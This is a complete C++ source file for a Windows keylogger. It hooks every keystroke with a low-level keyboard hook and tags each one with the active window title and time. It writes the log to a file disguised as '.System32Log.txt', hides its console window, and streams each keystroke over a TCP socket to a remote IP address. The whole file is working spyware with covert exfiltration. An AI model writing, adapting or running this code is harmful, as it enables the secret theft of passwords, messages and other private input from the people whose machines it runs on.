
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <winsock2.h>
#include <stdio.h>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)
#define BUFFERSIZE 100

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];

int ServerConnect(SOCKET &sockfd);
SOCKET sockfd;

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char lastwindow[256];
    
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks
	
	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        //get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
			char message[BUFFERSIZE];
			strcpy(message, "\n\n[Window: ");
			strcat(message, window_title);
			strcat(message, " - at ");
			strcat(message, s);
			strcat(message, "] ");
			
            OUTPUT_FILE << message;
		    send(sockfd, message, BUFFERSIZE, 0);
			
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK){
        OUTPUT_FILE << "[BACKSPACE]";
		send(sockfd, "[BACKSPACE]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_RETURN){
		OUTPUT_FILE <<  "\n";
		send(sockfd, "\n", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_SPACE){
		OUTPUT_FILE << " ";
		send(sockfd, " ", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_TAB){
		OUTPUT_FILE << "[TAB]";
		send(sockfd, "[TAB]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT){
		OUTPUT_FILE << "[SHIFT]";
		send(sockfd, "[SHIFT]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL){
		OUTPUT_FILE << "[CTRL]";
		send(sockfd, "[CTRL]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_ESCAPE){
		OUTPUT_FILE << "[ESCAPE]";
		send(sockfd, "[ESCAPE]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_END){
		OUTPUT_FILE << "[END]";
		send(sockfd, "[END]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_HOME){
		OUTPUT_FILE << "[HOME]";
		send(sockfd, "[HOME]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_LEFT){
		OUTPUT_FILE << "[LEFT]";
		send(sockfd, "[LEFT]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_UP){
		OUTPUT_FILE << "[UP]";
		send(sockfd, "[UP]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_RIGHT){
		OUTPUT_FILE << "[RIGHT]";
		send(sockfd, "[RIGHT]", BUFFERSIZE, 0);
	}
	else if (key_stroke == VK_DOWN){
		OUTPUT_FILE << "[DOWN]";
		send(sockfd, "[DOWN]", BUFFERSIZE, 0);
	}
	else if (key_stroke == 190 || key_stroke == 110){
		OUTPUT_FILE << ".";
		send(sockfd, ".", BUFFERSIZE, 0);
	}
	else if (key_stroke == 189 || key_stroke == 109){
		OUTPUT_FILE << "-";
		send(sockfd, "-", BUFFERSIZE, 0);
	}
	else if (key_stroke == 20){
		OUTPUT_FILE << "[CAPSLOCK]";
		send(sockfd, "[CAPSLOCK]", BUFFERSIZE, 0);
	}
	else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;   
        }

        //map virtual key according to keyboard layout 
        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
        
        //tolower converts it to lowercase properly
        if (!lowercase) key = tolower(key);
		OUTPUT_FILE <<  char(key);
		send(sockfd, &key, 1, 0);
		
    }
	//instead of opening and closing file handlers every time, keep file open and flush.
    OUTPUT_FILE.flush();
	
	
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}

int ServerConnect(SOCKET &sockfd) {
    int result;
    struct sockaddr_in address;
    int len;
    WSADATA wsadata;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("10.1.2.233");
    address.sin_port = 80;
    len = sizeof(address);
	
	if(WSAStartup(0x101,(LPWSADATA)&wsadata) != 0) {
        printf("Winsock Error\n"); 
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    result = connect(sockfd, (struct sockaddr *)&address, len);  
    if(result == -1) {
        printf("Connetc Error");
        return -1;
    }
	else{
	    return 0;
	}
}

int main()
{
	//open output file in append mode
    OUTPUT_FILE.open(".System32Log.txt",std::ios_base::app);	

	// visibility of window
	Stealth();

	// Connect to server
	ServerConnect(sockfd);

	// Set the hook
	SetHook();
	

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}